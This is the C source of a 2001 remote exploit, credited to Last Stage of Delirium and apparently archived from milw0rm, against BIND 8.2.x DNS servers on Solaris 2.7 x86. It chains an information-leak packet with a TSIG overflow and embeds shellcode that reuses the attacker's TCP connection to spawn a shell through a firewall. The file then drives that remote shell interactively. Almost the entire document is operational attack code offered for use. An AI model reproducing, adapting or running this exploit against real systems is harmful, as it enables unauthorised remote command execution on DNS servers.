/*## copyright LAST STAGE OF DELIRIUM feb 2001 poland        *://lsd-pl.net/ #*/
/*## bind 8.2 8.2.1 8.2.2 8.2.2-PX                           Solaris 2.7 x86 #*/

/* The code establishes a TCP connection with port 53 of a target system.     */
/* It makes use of the "infoleek" bug (through UDP) to obtain the base        */
/* value of the named process frame stack pointer, which is later used        */
/* for constructing proper DNS tsig exploit packet.                           */
/*                                                                            */
/* Upon successful exploitation the assembly routine gets executed. It        */
/* walks the descriptor table of the exploited named process in a search      */
/* for the socket descriptor of the previously established TCP connection.    */
/* Found descriptor is duplicated on stdin, stdout and stderr and /bin/sh     */
/* is spawned.                                                                */
/*                                                                            */
/* The use of such an assembly routine allows successfull exploitation of     */
/* the vulnerability in the case when vulnerable dns servers are protected    */
/* by tightly configured firewall systems (with only 53 tcp/udp port open).   */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

char msg[]={
    0xab,0xcd,0x09,0x80,0x00,0x00,0x00,0x01,
    0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
    0x01,0x20,0x20,0x20,0x20,0x02,0x61
};

char asmcode[]=
    "\x1b"                 /* label len 1+26                 */
    "\x90"                 /* padding                        */

    "\x33\xc0"             /* xorl    %eax,%eax              */
    "\xeb\x09"             /* jmp     <syscallcode+13>       */
    "\x5f"                 /* popl    %edi                   */
    "\x57"                 /* pushl   %edi                   */
    "\x47"                 /* incl    %edi                   */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x47"                 /* incl    %edi                   */
    "\xaa"                 /* stosb   %al,%es:(%edi)         */
    "\x5e"                 /* popl    %esi                   */
    "\xeb\x0e"             /* jmp     <syscallcode+26+1>     */
    "\xe8\xf2\xff\xff\xff" /* call    <syscallcode+4>        */
    "\x9a\xff\xff\xff\xff"
    "\x07\xff"
    "\xc3"                 /* ret                            */

    "\x33"                 /* label len 51                   */

    "\x56"                 /* pushl   %esi                   */
    "\x5f"                 /* popl    %edi                   */
    "\x83\xef\x7c"         /* subl    $0x7c,%edi             */
    "\x57"                 /* pushl   %edi                   */
    "\x8d\x4f\x10"         /* leal    0x10(%edi),%ecx        */
    "\xb0\x44"             /* movb    $0x44,%al              */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x91"                 /* xchgl   %ecx,%eax              */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x95"                 /* xchgl   %eax,%ebp              */
    "\x66\xb9\x91\x54"     /* movw    $0x5491,%cx            */
    "\x51"                 /* pushl   %ecx                   */
    "\x66\xb9\x01\x01"     /* movw    $0x0101,%cx            */
    "\x51"                 /* pushl   %ecx                   */
    "\x33\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x36"             /* movb    $0x36,%al              */
    "\xff\xd6"             /* call    *%esi                  */
    "\x59"                 /* popl    %ecx                   */
    "\x33\xdb"             /* xorl    %ebx,%ebx              */
    "\x3b\xc3"             /* cmpl    %ebx,%eax              */
    "\x75\x0a"             /* jne     <findsckcode+49>       */
    "\x66\xbb\x12\x34"     /* movw    $0x1234,%bx            */
    "\x66\x39\x5d\x02"     /* cmpw    %bx,0x2(%ebp)          */
    "\x74\x03"             /* je      <findsckcode+51+1>     */
    "\xe2\xe6"             /* loop    <findsckcode+25>       */

    "\x37"                 /* label len 21+34                */

    "\xb0\x09"             /* movb    $0x09,%al              */
    "\x50"                 /* pushl   %eax                   */
    "\x51"                 /* pushl   %ecx                   */
    "\x91"                 /* xchgl   %ecx,%eax              */
    "\xb1\x03"             /* movb    $0x03,%cl              */
    "\x49"                 /* decl    %ecx                   */
    "\x89\x4c\x24\x08"     /* movl    %ecx,0x8(%esp)         */ 
    "\x41"                 /* incl    %ecx                   */
    "\x33\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x3e"             /* movb    $0x3e,%al              */
    "\xff\xd6"             /* call    *%esi                  */
    "\xe2\xf2"             /* loop    <findsckcode+58+1>     */

    "\xeb\x13"             /* jmp     <shellcode+21>         */
    "\x33\xd2"             /* xorl    %edx,%edx              */
    "\x58"                 /* popl    %eax                   */
    "\x8d\x78\x14"         /* leal    0x14(%eax),edi         */
    "\x52"                 /* pushl   %edx                   */
    "\x57"                 /* pushl   %edi                   */
    "\x50"                 /* pushl   %eax                   */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x92"                 /* xchgl   %eax,%edx              */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x88\x42\x08"         /* movb    %al,0x8(%edx)          */
    "\xb0\x3b"             /* movb    $0x3b,%al              */
    "\xff\xd6"             /* call    *%esi                  */
    "\xe8\xe8\xff\xff\xff" /* call    <shellcode+2>          */
    "/bin/ksh"
;

int rev(int a){
    int i=1;
    if((*(char*)&i)) return(a);
    return((a>>24)&0xff)|(((a>>16)&0xff)<<8)|(((a>>8)&0xff)<<16)|((a&0xff)<<24);
}

int main(int argc,char **argv){
    char buffer[1024],*b;
    int i,c,n,sck[2],fp,ptr6,jmp,cnt,ofs,flag=-1;
    struct hostent *hp;
    struct sockaddr_in adr;

    printf("copyright LAST STAGE OF DELIRIUM feb 2001 poland  //lsd-pl.net/\n");
    printf("bind 8.2 8.2.1 8.2.2 8.2.2PX for solaris 2.7 x86\n\n");

    if(argc<2){
        printf("usage: %s address [-s][-e]\n",argv[0]);
        printf("    -s  send infoleek packet\n");
        printf("    -e  send exploit packet\n");
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"se"))!=-1){
        switch(c){
        case 's': flag=1;break;
        case 'e': flag=2;
        }
    }
    if(flag==-1) exit(-1);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(53);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1) {
        if((hp=gethostbyname(argv[1]))==NULL) {
            errno=EADDRNOTAVAIL;goto err;
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    sck[0]=socket(AF_INET,SOCK_DGRAM,0);
    sck[1]=socket(AF_INET,SOCK_STREAM,0);

    if(connect(sck[0],(struct sockaddr*)&adr,sizeof(adr))<0) goto err;
    if(connect(sck[1],(struct sockaddr*)&adr,sizeof(adr))<0) goto err;

    i=sizeof(struct sockaddr_in);
    if(getsockname(sck[1],(struct sockaddr*)&adr,&i)==-1){
        struct netbuf {unsigned int maxlen;unsigned int len;char *buf;};
        struct netbuf nb;
        ioctl(sck[1],(('S'<<8)|2),"sockmod");
        nb.maxlen=0xffff;
        nb.len=sizeof(struct sockaddr_in);;
        nb.buf=(char*)&adr;
        ioctl(sck[1],(('T'<<8)|144),&nb);
    }
    n=ntohs(adr.sin_port);

    asmcode[1+1+26+1+39+2]=(unsigned char)((n>>8)&0xff);
    asmcode[1+1+26+1+39+3]=(unsigned char)(n&0xff);

    if(write(sck[0],msg,sizeof(msg))==-1) goto err;
    if((cnt=read(sck[0],buffer,sizeof(buffer)))==-1) goto err;
   
    printf("stack dump:\n");
    for(i=0;i<(cnt-512);i++){
        printf("%s%02x ",(i&&(!(i%16)))?"\n":"",(unsigned char)buffer[512+i]);
    }
    printf("\n\n");

    fp=rev(*(unsigned int*)&buffer[532]);
    ofs=0x0106-((fp-(fp&0xffffff00))&0xff);
    cnt=163;

    if((buffer[512+20+2]!=(char)0x04)&&(buffer[512+20+3]!=(char)0x08)){
        printf("system does not seem to be a vulnerable solaris\n");exit(1);
    }

    if(flag==1){
        printf("system seems to be running bind 8.2.x on a solaris\n");exit(-1);
    }

    if(cnt<(ofs+12)){
        printf("frame ptr is too low to be successfully exploited\n");exit(-1);
    }

    jmp=rev(fp-583);
    ptr6=rev((fp&0xffffff00)+8);
    fp=rev(fp&0xffffff00);

    printf("frame ptr=0x%08x adr=%08x ofs=%d ",rev(fp),rev(jmp),ofs);
    printf("port=%04x connected! ",(unsigned short)n);fflush(stdout);

    b=buffer;
    memcpy(b,"\xab\xcd\x01\x00\x00\x02\x00\x00\x00\x00\x00\x01",12);b+=12;
    for(i=0;i<strlen(asmcode);i++) *b++=asmcode[i];
    for(i=0;i<(120>>1);i++,b++) *b++=0x01;
    memcpy(b,"\x00\x00\x01\x00\x01",5);b+=5;
    for(i=0;i<((ofs+64)>>1);i++,b++) *b++=0x01;

    *b++=12;
    memcpy(b,&jmp,4);b+=4;
    memcpy(b,"\x06\x00\x00\x00",4);b+=4;
    memcpy(b,&ptr6,4);b+=4;
    cnt-=ofs+12;
    for(i=0;i<(cnt>>1);i++,b++) *b++=0x01;

    memcpy(b,"\x00\x00\x01\x00\x01\x00\x00\xfa\xff",9);b+=9;

    if(write(sck[0],buffer,b-buffer)==-1) goto err;
    sleep(1);printf("sent!\n");

    write(sck[1],"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck[1],&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck[1],buf,cnt);
            }
            if(FD_ISSET(sck[1],&fds)){
                if((cnt=read(sck[1],buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
    exit(0);
err:
    perror("error");exit(-1);
}

// milw0rm.com [2001-03-01]
